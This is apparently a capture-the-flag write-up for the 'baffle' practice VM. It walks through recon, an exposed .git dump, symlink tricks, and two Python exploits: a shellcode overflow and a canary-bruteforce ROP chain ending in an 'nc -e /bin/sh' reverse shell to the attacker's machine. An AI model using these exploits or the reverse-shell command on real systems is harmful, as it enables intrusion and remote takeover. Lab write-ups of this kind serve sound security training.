@@ -1,0 +1,440 @@
+Recon phase
+netdiscover -r 172.16.34.0/24 -i vmnet8
+172.16.34.149
+
+nmap -p 1-65535 -T4 -A -v 172.16.34.149
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
+|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
+|_  256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
+80/tcp   open  http     nginx 1.6.2
+| http-git:
+|   172.16.34.149:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Trashed my code, but deployed the product anyway.
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.6.2
+|_http-title: baffle
+6969/tcp open  acmsoda?
+
+dirb http://172.16.34.149
+
+---- Scanning URL: http://172.16.34.149/ ----
++ http://172.16.34.149/.git/HEAD (CODE:200|SIZE:23)
+============================================================================
+i downloaded .git file
+wget -r http://172.16.34.149/.git/
+
+cat 172.16.34.149/.git/logs/HEAD
+
+0000000000000000000000000000000000000000 7f904e66033e780204d4f1d17b0e735a248e96cf
+root <root@binariez> 1476728711 -0400
+commit (initial): Hello, friend...
+7f904e66033e780204d4f1d17b0e735a248e96cf d7a1f067a2f4ac469bc4cf77c689a34e2286b665
+alice <alice@baffle.me> 1476729020 -0400
+commit (amend): Hello, friend...
+d7a1f067a2f4ac469bc4cf77c689a34e2286b665 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
+alice <alice@baffle.me> 1476729434 -0400
+commit: This coder turned coffee into code. You won't believe how she did it!
+7edc47a1c3e4dc880a7191915bdbf1565c6b7441 06483346fab91b2b17471074a887ac7dffd9ceda
+alice <alice@baffle.me> 1476729865 -0400
+commit: My cat danced on the keyboard
+06483346fab91b2b17471074a887ac7dffd9ceda 9b5c226d15d611d6957f3fda7c993186270a6cc4
+alice <alice@baffle.me> 1476730360 -0400
+commit: Made it into a write-type-thing instead
+9b5c226d15d611d6957f3fda7c993186270a6cc4 d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+alice <alice@baffle.me> 1476730507 -0400
+commit: Some assembly required
+d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
+alice <alice@baffle.me> 1476730682 -0400
+commit: Trashed my code, but deployed the product anyway.
+
+
+git clone .git new
+
+i tried all commits then i got this commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+i found project.enc
+it's base64 so i converted it
+cat project.enc | base64 -d > project
+its executable file
+while debugging it using gdb -q project i noticed that the main function call a function parse_request
+0x0000000000400746 <+0>:	push   %rbp
+0x0000000000400747 <+1>:	mov    %rsp,%rbp
+0x000000000040074a <+4>:	sub    $0x630,%rsp
+0x0000000000400751 <+11>:	mov    %rdi,-0x628(%rbp)
+0x0000000000400758 <+18>:	mov    %esi,-0x62c(%rbp)
+0x000000000040075e <+24>:	mov    -0x628(%rbp),%rax
+0x0000000000400765 <+31>:	mov    %rax,-0x8(%rbp)
+0x0000000000400769 <+35>:	lea    -0x410(%rbp),%rax
+0x0000000000400770 <+42>:	mov    $0x1f4,%edx
+0x0000000000400775 <+47>:	mov    $0x0,%esi
+0x000000000040077a <+52>:	mov    %rax,%rdi
+0x000000000040077d <+55>:	callq  0x4005e0 <memset@plt>
+0x0000000000400782 <+60>:	lea    -0x620(%rbp),%rax
+0x0000000000400789 <+67>:	mov    $0xa,%edx
+0x000000000040078e <+72>:	mov    $0x0,%esi
+0x0000000000400793 <+77>:	mov    %rax,%rdi
+0x0000000000400796 <+80>:	callq  0x4005e0 <memset@plt>
+0x000000000040079b <+85>:	mov    -0x628(%rbp),%rax
+0x00000000004007a2 <+92>:	add    $0x1,%rax
+0x00000000004007a6 <+96>:	movzbl (%rax),%eax
+0x00000000004007a9 <+99>:	movsbl %al,%eax
+0x00000000004007ac <+102>:	mov    %eax,-0xc(%rbp)
+0x00000000004007af <+105>:	cmpl   $0x1,-0xc(%rbp)
+0x00000000004007b3 <+109>:	jne    0x40084f <parse_request+265>
+0x00000000004007b9 <+115>:	addq   $0x2,-0x8(%rbp)
+0x00000000004007be <+120>:	mov    -0x62c(%rbp),%eax
+0x00000000004007c4 <+126>:	sub    $0x9,%eax
+0x00000000004007c7 <+129>:	mov    %eax,-0x10(%rbp)
+0x00000000004007ca <+132>:	mov    -0x10(%rbp),%eax
+0x00000000004007cd <+135>:	movslq %eax,%rdx
+0x00000000004007d0 <+138>:	mov    -0x8(%rbp),%rcx
+0x00000000004007d4 <+142>:	lea    -0x410(%rbp),%rax
+0x00000000004007db <+149>:	mov    %rcx,%rsi
+
+then i tried to disassemble it and i noticed its connected to port 6969
+and it use to open a file and then read it by using fopen call and number of characters
+let's use ltrace to feed it with a file to read
+echo "Hiiiii" > newfile
+python -c'print "\x01\x01newfile"' | ltrace ./project
+__libc_start_main(0x4008f7, 1, 0x7fff97dea508, 0x400980 <unfinished ...>
+setbuf(0x7fd20b599600, 0)                                            = <void>
+memset(0x7fff97de9c40, '\0', 2000)                                   = 0x7fff97de9c40
+read(0, "\001\001newfile\n", 2000)                                   = 10
+memset(0x7fff97de9810, '\0', 500)                                    = 0x7fff97de9810
+memset(0x7fff97de9600, '\0', 10)                                     = 0x7fff97de9600
+memcpy(0x7fff97de9810, "n", 1)                                       = 0x7fff97de9810
+fopen("n", "r")                                                      = 0
++++ exited (status 0) +++
+
+after traying
+python -c'print "\x01\x01newfilezzzzzz"' | ltrace ./project
+__libc_start_main(0x4008f7, 1, 0x7ffd77c50828, 0x400980 <unfinished ...>
+setbuf(0x7f6fb4add600, 0)                                            = <void>
+memset(0x7ffd77c4ff60, '\0', 2000)                                   = 0x7ffd77c4ff60
+read(0, "\001\001newfilezzzzzz\n", 2000)                             = 16
+memset(0x7ffd77c4fb30, '\0', 500)                                    = 0x7ffd77c4fb30
+memset(0x7ffd77c4f920, '\0', 10)                                     = 0x7ffd77c4f920
+memcpy(0x7ffd77c4fb30, "newfile", 7)                                 = 0x7ffd77c4fb30
+fopen("newfile", "r")                                                = 0x1f8e010
+memset(0x7ffd77c4f930, '\0', 500)                                    = 0x7ffd77c4f930
+fgets("Hiiiii\n", 500, 0x1f8e010)                                    = 0x7ffd77c4f930
+printf("%s", "Hiiiii\n"Hiiiii
+)                                             = 7
++++ exited (status 0) +++
+
+so i tried with 6969 port
+so i tried with file flag.txt
+
+python -c'print "\x01\x01flag.txtxxxxxx"' | nc 172.16.34.149 6969
+FLAG{is_there_an_ivana_tinkle} ==> First flag
+============================================================================
+in commit 06483346fab91b2b17471074a887ac7dffd9ceda i noticed changes in code from
+capital to small characters in hellofriend.c
+/////////////////////////////
+-    file_len = n - 2 - 5 - 2;
++    FiLe_len = n - 2 - 5 - 2;
+-int main(int argc, char *argv[]) {
++int mAin(int arGc, char *argv[]) {
+-    parse_request(buf, n);
++    p{ARSE_REQUEST}(buf, n);
+/////////////////////////////
+
+so back to this commit and try to extract those capita characters
+git checkout 06483346fab91b2b17471074a887ac7dffd9ceda
+grep -o "[A-Z]" hellofriend.c | tr -d '\n'
+FILEFLAGARSEREQUEST ==> Second flag
+============================================================================
+let's try a shellcode
+
+from pwn import *
+from struct import *
+
+# msfvenom -p linux/x64/exec -v shell -f py CMD="/bin/bash"
+shell =  ""
+shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
+shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
+shell += "\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
+shell += "\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"
+
+buf =  "\x02\x02\x00"
+buf += "\x90" * 20
+buf += shell
+buf += "\x90"*(522-len(shell))
+buf += pack("<Q", 0x600de0)
+
+host = "172.16.34.149"
+port = 6969
+
+try:
+    p = remote(host, port)
+    p.sendline(buf)
+    p.interactive()
+except EOFError as e:
+    log.error(e)
+finally:
+    with context.quiet:
+        p.close()
+i took the idea of shellcode from zionspike
+
+after execute
+[+] Opening connection to 172.16.34.149 on port 6969: Done
+[*] Switching to interactive mode
+i found a message
+cat /var/mail/alice
+
+From bob@baffle.me  Thu Jan  2 11:38:22 2014
+Return-Path: <root@baffle.me>
+X-Original-To: alice
+Delivered-To: alice@baffle.me
+Received: by baffle.me (Postfix, from userid 0)
+        id B612F2C0E36; Thu,  2 Jan 2014 11:38:22 -0800 (PST)
+From: Bob <bob@baffle.me>
+To: alice@baffle.me
+Subject: Flag #2
+Message-Id: <2014010204825.B612F2C0E36@baffle.me>
+Date: Thu,  2 Jan 2014 11:38:22 -0800 (PST)
+
+Alice,
+
+I need you to login to my account. My password is in /home/bob/flag.txt
+You'll need to authenticate to Flag Vault in order to get its contents.
+
+--
+Bob
+
+then i went to bob/filez
+./flag_vault
+
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
+| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
+|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+                __/ |
+               |___/
+
+ENTER YOUR AUTHENTICATION CODE: $
+
+then i tried making a link in alice home directory
+ln -s flag_vault /home/alice/flag_vault
+ln -s /flag.txt /home/alice/flag.txt
+echo hii > auth.txt
+then i use the same work "hii"
+$ ./flag_vault
+______ _                _    _   _             _ _
+|  ___| |            /\| |/\| | | |           | | |
+| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
+|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+                __/ |
+               |___/
+
+ENTER YOUR AUTHENTICATION CODE: $ hii
+CHECKING CODE... CODE IS VALID
+DATA: FLAG{tr3each3ry_anD_cUnn1ng} ==> Third flag
+============================================================================
+So "tr3each3ry_anD_cUnn1ng" is bob's login
+then i tried to access via ssh
+ssh bob@172.16.34.149
+then i navigated to binz
+./ctfingerd
+bind: Address already in use
+Let's dig up
+netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:7979          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 172.16.34.149:22        172.16.34.1:40364       ESTABLISHED -
+tcp        0      0 172.16.34.149:6969      172.16.34.1:41098       ESTABLISHED -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+notice 7979
+i tried to connect to using nc
+nc 127.0.0.1 7979
+Socket fd: 7
+User to query: bob
+Checking...
+Vulnerable by Design
+------
+bob@baffle:~/binz$ nc 127.0.0.1 7979
+Socket fd: 8
+User to query: charlie
+Checking...
+I haz a flag mwahahaha
+------
+So this read .plan file inside /home/{username}
+but the .plan in charlie sure contain "I haz a flag mwahahaha"
+So i created a new directory
+mkdir new
+ln -s /home/charlie/flag.txt new/
+
+Then
+nc 127.0.0.1 7979
+Socket fd: 13
+User to query: bob/new
+Checking...
+FLAG{i_haz_sriracha_ice_cream} ==> Fourth flag
+---
+============================================================================
+I tried to debug ctfingerd a lot and the only approach i could get was stack canary
+so ctfingerd can not detect smashing stack after 1001 char
+
+so i re-used zionspike's code too
+-----------
+from socket import *
+import time
+from struct import *
+
+host = "127.0.0.1"
+port = 7979
+
+def find_canary_pos():
+        print "[+] Finding canary position..."
+        canary_pos = 995
+        while True:
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((host, 7979))
+                response = s.recv(1024)
+                s.send("A"* canary_pos)
+                time.sleep(0.1)
+                response = s.recv(1024)
+                s.close()
+                if "---" not in response:
+                        break
+                canary_pos = canary_pos + 1
+        return canary_pos - 1
+
+def bruteforce_canary(canary_pos):
+        # (b...)(a...)(d..)(c.........)(CANARY)(CTLI)(RETA)
+        # .............................(A     )......... >> ret an error
+        # .............................(C     )......... >> ret no error
+        # .............................(CA    )......... >> ret no error
+        # .............................(CAN   )......... >> ret no error
+        # ...so on...
+        print "[+] Bruteforcing canary..."
+        canary = ""
+        for byte in xrange(8):
+                for cnr in xrange(256):
+                        hex_byte = chr(cnr)
+                        tmp_cnr = canary + hex_byte
+                        s = socket(AF_INET, SOCK_STREAM)
+                        s.connect((host, port))
+                        s.recv(1024)
+                        payload = "A" * canary_pos + tmp_cnr
+                        s.send(payload)
+                        s.recv(1024)
+                        time.sleep(0.1)
+                        rec = s.recv(1024)
+                        s.close()
+                        if "---" in rec:
+                                canary = tmp_cnr
+                                print("[+] Found byte("+str(byte)+"): " + hex_byte.encode("hex"))
+                                break
+        return canary
+
+
+canary_position = find_canary_pos()
+print "[+] Canary position: " + str(canary_position)
+canary = bruteforce_canary(canary_position)
+print "[+] Canary: " + canary.encode("hex")
+#  Find sock FD to change stdout to socket
+s = socket()
+s.connect((host, port))
+response = s.recv(1024)
+fd_pos = response.find("Socket FD: ")
+socket_FD = int(response[fd_pos + 11:response.find("\n",fd_pos + 5)])
+print "[+] Socket FD: " + str(socket_FD)
+
+libc_memset_offset = 0x85620 # readelf -s libc.so.6 | grep memset
+libc_system_offset = 0x41490 # readelf -s libc.so.6 | grep system
+write_plt = 0x400920 # objdump -d ./ctfingerd | grep -A5 write@
+read_plt = 0x4009b0 # objdump -d ./ctfingerd | grep -A5 read@
+memset_GOT = 0x6014e0 # objdump -R ./ctfingerd | grep memset
+poprdi_OP = 0x00401013 # pop rdi; ret obcode
+poprsi_OP = 0x00401011 # pop rsi ; pop r15 ; ret obcode
+
+payload = "A" * canary_position
+payload += canary
+payload += pack("<Q", 0x00)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", socket_FD)
+payload += pack("<Q", poprsi_OP)
+payload += pack("<Q", memset_GOT)
+payload += pack("<Q", 0x00)
+payload += pack("<Q", write_plt)
+s.send(payload)
+time.sleep(0.1)
+response = s.recv(1024)
+s.shutdown(1)
+s.close()
+split = response.split("\n")
+memset_addr = unpack("<Q", split[2][:8])
+libc_base = (memset_addr[0] - libc_memset_offset)
+system_addr = (libc_base + libc_system_offset)
+
+print "[+] Leaked memset addr: ", hex(memset_addr[0])
+print "[+] libc base addr: ", hex(libc_base)
+print "[+] sysem addr: ", hex(system_addr)
+
+socket_FD = socket_FD + 1
+print "[+] New Socket FD" + str(socket_FD)
+
+payload = ""
+payload += "A" * canary_position
+payload += canary
+payload += pack("<Q", 0x00)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", socket_FD)
+payload += pack("<Q", poprsi_OP)
+payload += pack("<Q", 0x601010)
+payload += pack("<Q", socket_FD)
+payload += pack("<Q", read_plt)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", 0x601010)
+payload += pack("<Q", system_addr)
+
+s = socket()
+s.connect((host, port))
+print s.recv(1024)
+s.send(payload)
+time.sleep(0.1)
+
+print "[+] Exploit..."
+for i in range(0, 1000):
+        s.send('/bin/nc 1172.16.34.1 1234 -e /bin/sh\x00')
+--------------
+and from kali machine i executed
+nc -lvp 1234
+then i got a shell
+cat flag.txt
+Sorry Mario. The flag is in another castle.
+cd .my_loot
+ls
+flag.txt
+cat flag.txt
+
+
+        !!! CONGRATULATIONS !!!
+
+                 .-"-.
+                / 4 4 \
+                \_ v _/
+                //   \\
+               ((     ))
+         =======""===""=======
+                  |||
+                  '|'
+
+      FLAG{i_tot_i_saw_a_puddy_tat} ==> Fifth flag
+============================================================================
